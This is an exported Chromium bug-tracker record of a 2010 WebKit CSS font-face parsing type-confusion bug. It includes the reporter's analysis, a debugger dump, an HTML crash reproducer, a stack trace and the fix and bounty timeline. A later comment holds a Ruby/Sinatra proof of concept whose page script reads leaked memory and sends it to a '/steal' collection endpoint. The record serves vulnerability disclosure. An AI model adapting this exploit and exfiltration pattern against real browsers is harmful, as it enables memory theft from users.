# WebKit CSS Font Face Parsing Type Confusion

| Field | Value |
|-------|-------|
| **Issue ID** | [40085139](https://issues.chromium.org/issues/40085139) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink |
| **Reporter** | ch...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2010-11-20 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

The CSS parser internally stores a CSSParserValueList which contains a vector of CSSParserValue structures. The CSSParserValue structure contains a union. Within that union is a double, an integer, a CSSParserString structure and a pointer to a CSSParserFunction object. Depending on the type of CSS value parsed a different member of this union will be used. In the case of my POC the double 'fValue' holds the value specified in the local() CSS selector. The structure during runtime just before crash:

(gdb) print \*a  

$9 = {id = 0, isInt = true, {fValue = 2097153, iValue = -2147483648, string = {characters = 0x80000000,  

length = 1094713344}, function = 0x80000000}, unit = 1}  

(gdb) x/8x a  

0xb25b4420: 0x00000000 0x41400001 0x80000000 0x41400000  

0xb25b4430: 0x00000001 0xff000000 0x00750001 0x00000000

This sets the string->characters pointer to 0x80000000 while string->length is 0x41400000 (1094713344) because fValue is stored over 2 32bit dwords. Coincidentally on line 3638 of CSSParser.cpp the unit type of the value is never checked and the String() operator is invoked on this structure. And because string->characters is not NULL it attempts to allocate (string->length\*2) for the new string that will be read from 0x80000000. The value of fValue directly controls where the string is read from in memory (string->characters), but not where its written to. For this example above, the allocator will fail when trying to allocate 2gb of memory (due to the length multiplication in StringImpl::create). A 32bit process will abort, a 64bit process should succeed in the allocation but probably crash in a subsequent memcpy when attempting to read from an unmapped page above string->characters.

**VERSION**

Chrome Version: Tested on Chrome 7.0.517.44 and Chrome 8.0.552.200 (beta)  

Operating System: Win7 32bit, Ubuntu 10.10 32bit

**REPRODUCTION CASE**

--

<html><body><h1 id=1 style="src: local(2097153)" /></body></html>
--

Type of crash: Tab  

Crash State: Stack trace of Chrome 8.0.552.200 on Win7 32bit

41400000 683a7c50 002ed56c chrome\_68390000!`anonymous namespace'::OnNoMemory(void)+0x3f [c:\b\slave\chrome-official\build\src\chrome\app\chrome\_dll\_main.cc @ 184]  

002ed56c 41400000 002ed594 chrome\_68390000!call\_new\_handler(bool nothrow = true)+0x31 [c:\b\slave\chrome-official\build\src\base\allocator\allocator\_shim.cc @ 75]  

82800014 68a6b1fb 82800014 chrome\_68390000!malloc(unsigned int size = 0x68a6c7c8)+0x63 [c:\b\slave\chrome-official\build\src\base\allocator\allocator\_shim.cc @ 120]  

82800014 68a6b24a 002ed568 chrome\_68390000!WTF::fastMalloc(unsigned int n = 0x68a6c7c8)+0x9 [c:\b\slave\chrome-official\build\src\third\_party\webkit\javascriptcore\wtf\fastmalloc.cpp @ 250]  

002ed568 002ed600 01718218 chrome\_68390000!WTF::StringImpl::createUninitialized(unsigned int length = 0x683935b0, wchar\_t \*\* data = 0x002ed56c)+0x2d [c:\b\slave\chrome-official\build\src\third\_party\webkit\javascriptcore\wtf\text\stringimpl.cpp @ 87]  

002ed594 80000000 01718618 chrome\_68390000!WTF::StringImpl::create(wchar\_t \* characters = 0x80000000 "--- memory read error at address 0x80000000 ---", unsigned int length = 0x2cb)+0x24 [c:\b\slave\chrome-official\build\src\third\_party\webkit\javascriptcore\wtf\text\stringimpl.cpp @ 99]  

80000000 41400000 00000454 chrome\_68390000!WTF::String::String(wchar\_t \* characters = 0x80000000 "--- memory read error at address 0x80000000 ---", unsigned int length = 0x41400000)+0x21 [c:\b\slave\chrome-official\build\src\third\_party\webkit\javascriptcore\wtf\text\wtfstring.cpp @ 42]  

002eed5c 002eed5c 00000000 chrome\_68390000!WebCore::CSSParser::parseFontFaceSrc(void)+0x184 [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\css\cssparser.cpp @ 3633]  

00000454 00000000 00000000 chrome\_68390000!WebCore::CSSParser::parseValue(int propId = 0n1108, bool important = false)+0xe6c [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\css\cssparser.cpp @ 1180]  

002eed5c 00ae6180 002eed5c chrome\_68390000!cssyyparse(void \* parser = 0x002eed5c)+0x1adb [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\css\cssgrammar.y @ 1422]  

002eed5c 00ae6180 00afba2c chrome\_68390000!WebCore::CSSParser::parseDeclaration(class WebCore::CSSMutableStyleDeclaration \* declaration = 0x00ae6180, class WTF::String \* string = 0x00afba2c, class WTF::RefPtr[WebCore::CSSStyleSourceData](javascript:void(0);) \* styleSourceData = 0x00000000)+0x97 [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\css\cssparser.cpp @ 351]  

00afba2c 01719c80 00afba20 chrome\_68390000!WebCore::CSSMutableStyleDeclaration::parseDeclaration(class WTF::String \* styleDeclaration = 0x00afba2c)+0x32 [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\css\cssmutablestyledeclaration.cpp @ 595]  

00afba20 01719c80 00afba20 chrome\_68390000!WebCore::StyledElement::parseMappedAttribute(class WebCore::Attribute \* attr = 0x00afba20)+0xaf [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\dom\styledelement.cpp @ 252]  

00afba20 00acfb80 00acfb84 chrome\_68390000!WebCore::HTMLElement::parseMappedAttribute(class WebCore::Attribute \* attr = 0x00afba20)+0xa00 [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\html\htmlelement.cpp @ 257]  

01afba20 00000000 002eef34 chrome\_68390000!WebCore::StyledElement::attributeChanged(class WebCore::Attribute \* attr = 0x01afba20, bool preserveDecls = false)+0xd0 [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\dom\styledelement.cpp @ 187]  

01719c80 00000000 00000000 chrome\_68390000!WebCore::Element::setAttributeMap(class WTF::PassRefPtr[WebCore::NamedNodeMap](javascript:void(0);) list = class WTF::PassRefPtr[WebCore::NamedNodeMap](javascript:void(0);), WebCore::FragmentScriptingPermission scriptingPermission = FragmentScriptingAllowed (0n0))+0x149 [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\dom\element.cpp @ 733]  

00aae840 002eef40 002ef024 chrome\_68390000!WebCore::HTMLConstructionSite::createHTMLElement(class WebCore::AtomicHTMLToken \* token = 0x002ef024)+0x6e [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\html\parser\htmlconstructionsite.cpp @ 346]  

002ef024 002ef024 01718280 chrome\_68390000!WebCore::HTMLConstructionSite::insertHTMLElement(class WebCore::AtomicHTMLToken \* token = 0x68b4d183)+0x13 [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\html\parser\htmlconstructionsite.cpp @ 267]  

01718280 002ef024 00000000 chrome\_68390000!WebCore::HTMLTreeBuilder::processStartTagForInBody(class WebCore::AtomicHTMLToken \* token = 0x002ef024)+0x90d [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\html\parser\htmltreebuilder.cpp @ 773]  

002ef024 00b1a054 01718280 chrome\_68390000!WebCore::HTMLTreeBuilder::processStartTag(class WebCore::AtomicHTMLToken \* token = 0x002ef024)+0x64d [c:\b\slave\chrome-official\build\src\third\_party\webkit\webcore\html\parser\htmltreebuilder.cpp @ 1202]

## Timeline

### js...@chromium.org (2010-11-20)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-11-20)

Hey Chris, interesting bug and great analysis. One of us will get to it by Monday.

### js...@chromium.org (2010-11-23)

@cdn - Assigning you as owner. The explanation in the bug is good enough that it should be pretty trivial to get a patch upstream. Marking as medium because this looks like it could be an information leak, although I don't see a way to get code execution out of it.

### in...@chromium.org (2010-11-24)

https://bugs.webkit.org/show_bug.cgi?id=49883

### in...@chromium.org (2010-11-24)

@cdn fixed in http://trac.webkit.org/changeset/72685.

### in...@chromium.org (2010-12-02)

merged to m8 in r73160

### sc...@gmail.com (2010-12-03)

@chris.rohlf: congratulations! This bug has qualified for a $1000 Chromium Security Reward!

Although "medium" severity bugs rarely qualify for a reward, we were very favourably impressed by the high quality of this bug report. Hope to see you again :)

The fix will likely see light of day in the next patch, a couple of weeks out.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### ch...@gmail.com (2010-12-03)

I accept. Thanks! The only 3rd parties notified were security@webkit.org and security@apple.com

Heres a POC that will read 469 bytes from 0xbf95d38b (the stack when I was debugging this):

require 'rubygems'
require 'sinatra'

get '/steal' do
    data = params[:s]
    ## ... do something with data ...
end

get '/' do
<<-EOF
    <html>
      <script>
        function read_memory() {
            ele = document.getElementById('1');
            document.location = "http://localhost:4567/steal?s=" + encodeURI(ele.style.src);
        }
      </script>
      <h1 id=1 style="src: local(0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000996804085);" />
      <button onClick='read_memory()'>Click Me</button>
    </html>
EOF
end





### sc...@gmail.com (2010-12-03)

Nice... any notes on the hit rate with ASLR?
I usually use Chrome on 64-bit Linux, I'll have to recheck the amount of entropy on 64-bit :)

### ch...@gmail.com (2010-12-03)

I would imagine you wouldn't be too successful trying to read from the stack reliably but I don't have any numbers. IIRC 32bit Ubuntu Linux these days is either 12 or 19 bits of entropy. I did have some ideas on this though and they are mostly applicable outside of this vulnerability so this isn't the right forum for it. Shoot me an email chris.rohlf@gmail.com - I'd love to share them.

### sc...@gmail.com (2010-12-14)

@chris.rohlf: please e-mail cevans@chromium.org for the steps to collect your reward :D

### sc...@gmail.com (2010-12-17)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-12-17)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-12-18)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-12-18)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-12-18)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-01-12)

Invoice finalized; payment is in e-payment system.

### sc...@gmail.com (2011-03-15)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-06-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/63866?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/63869]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085139)*
